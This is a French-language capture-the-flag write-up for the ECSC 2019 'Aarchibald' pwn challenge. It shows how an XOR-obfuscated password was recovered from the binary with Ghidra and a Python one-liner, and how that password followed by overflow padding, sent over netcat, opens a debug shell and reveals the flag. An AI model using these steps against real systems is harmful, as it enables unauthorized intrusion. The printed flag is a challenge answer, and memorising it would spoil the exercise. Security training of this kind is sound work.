**Aarchibald WUP from ECSC 2019** 

Ahhhh, un peu de PWN pour changer, aujourd'hui on va attaquer un binaire qui était plutôt basique.

```
l0uky@parrot: ~ $ nc challenges.ecsc-teamfrance.fr 4005
Please enter your password:
coucou  
Sorry, that's not the correct password.
Bye.
```

Tout d'abord ouvrons notre binaire avec Ghidra et regardons la fonction "sym.main" (ou juste main)

<img src="https://i.imgur.com/qv3X6MT.png">

On voit tout d'abord que nous avons une condition de verification du password.

L'entrée utilisateur est comparée à `eCfSDFwEeAYDr` et est xorified + 0x36.

Bon déjà on remarque qu'il n'y a pas de verification du buffer, donc ça sera sûrement un buffer overflow.

Essayons donc d'entrer un payload basique.

```
l0uky@parrot: ~ $ (echo "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"; cat) | nc challenges.ecsc-teamfrance.fr 4005
Please enter your password:
Sorry, that's not the correct password.
Bye.
```


J'ai peut être pas mis assez de "a"

```
l0uky@parrot: ~ $ python -c 'print("A" * 120)' | nc challenges.ecsc-teamfrance.fr 4005
Please enter your password:
Sorry, that's not the correct password.
Bye.
```

Rien à y faire, il n'a pas l'air de vouloir, essayons donc de trouver le mot de passe.

```
>>> "".join([chr(i ^ 0x36) for i in b"eCfSDFwEeAYDr"])
'SuPerpAsSworD'
```

On a donc le pass déchiffré. Entrons le.

```
l0uky@parrot: ~ $ (echo "SuPerpAsSworD"; cat) | nc challenges.ecsc-teamfrance.fr 4005
Please enter your password:
Welcome back!
ls 
```

Très bien, on a réussis à entré; mais aucun shell n'a pop, testons donc d'ajouter un payload à côté.

SuPerpAsSworDaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa


```
l0uky@parrot: ~ $ nc challenges.ecsc-teamfrance.fr 4005
Please enter your password:
SuPerpAsSworDaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
Welcome back!
Entering debug mode
ls
aarchibald
flag
run.sh
cat flag
ECSC{32fb7ccc57121703b0a9a401e269e774c561b2bc}
```

Et voilà, nous avons donc le flag ***ECSC{32fb7ccc57121703b0a9a401e269e774c561b2bc}***
